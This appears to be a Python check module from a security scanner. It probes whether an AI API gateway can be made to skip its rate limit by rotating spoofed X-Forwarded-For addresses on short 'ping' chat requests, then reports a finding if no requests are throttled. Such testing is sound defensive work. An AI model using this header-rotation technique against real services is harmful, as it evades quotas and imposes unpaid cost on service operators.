"""aigateway-quota-bypass — 配额按 X-Forwarded-For 记账 → 轮换源地址绕过限流。

Ruling：探测请求仅含短 ping，不消耗真实额度；fixed 对照用合法租户 key。
"""
from __future__ import annotations

import importlib.util
from pathlib import Path

_PARENT = Path(__file__).resolve().parent.parent
_SPEC = importlib.util.spec_from_file_location("_aigateway_common", _PARENT / "_aigateway-common.py")
_COMMON = importlib.util.module_from_spec(_SPEC)
_SPEC.loader.exec_module(_COMMON)

KEY = "aigateway-quota-bypass"
WRITES = False
Trace, finding = _COMMON.Trace, _COMMON.finding
bearer, tenant_key, target = _COMMON.bearer, _COMMON.tenant_key, _COMMON.target
ok, resp, status = _COMMON.ok, _COMMON.resp, _COMMON.status

CHAT_BODY = {"model": "gpt-4o", "messages": [{"role": "user", "content": "ping"}]}


def run(ctx: dict, params: dict) -> dict:
    base = target(params)
    if not base:
        return {"summary": "no-target", "artifacts": [], "findings": []}
    tenant = str(params.get("tenant") or "tenant-a")
    headers = {**bearer(tenant_key(params)), "X-Tenant": tenant}
    count = max(4, int(params.get("requests") or 6))

    t = Trace(ctx, KEY)
    quota_before = t.call("GET", f"{base}/quota", headers=headers)
    xffs = [f"203.0.113.{10 + i}" for i in range(count)]
    statuses = []
    for xff in xffs:
        entry = t.call("POST", f"{base}/v1/chat/completions", CHAT_BODY,
                       {**headers, "X-Forwarded-For": xff})
        statuses.append(status(entry))
    quota_after = t.call("GET", f"{base}/quota", headers=headers)

    before = resp(quota_before)
    after = resp(quota_after)
    buckets_before = before.get("buckets") if isinstance(before.get("buckets"), dict) else {}
    buckets_after = after.get("buckets") if isinstance(after.get("buckets"), dict) else {}
    blocked = sum(1 for code in statuses if code == 429)
    enforced = bool(after.get("enforced", before.get("enforced")))

    findings: list[dict] = []
    if ok(quota_after) and not enforced and blocked == 0 and len(buckets_after) >= 3:
        detail = {
            "route": "/v1/chat/completions",
            "quota_route": "/quota",
            "http_status": status(quota_after),
            "enforced": False,
            "limit": after.get("limit", before.get("limit")),
            "bucket_by": after.get("bucket_by", before.get("bucket_by")),
            "requests": count,
            "statuses": statuses,
            "blocked_count": blocked,
            "buckets_before_count": len(buckets_before),
            "buckets_after": buckets_after,
            "distinct_buckets": len(buckets_after),
            "xff_values": xffs,
            "note": "配额按 X-Forwarded-For 分桶且代理头可伪造：轮换源地址即无限重置配额（成本型滥用）",
        }
        findings.append(finding(
            "high", f"配额绕过：轮换 X-Forwarded-For 后 {count} 次请求 0 限流（桶数 {len(buckets_after)}）", detail))

    artifact = t.dump()
    summary = (f"status={status(quota_after)} enforced={enforced} blocked={blocked}/{count} "
               f"buckets={len(buckets_after)}")
    return {"summary": summary, "artifacts": [str(artifact)], "findings": findings}
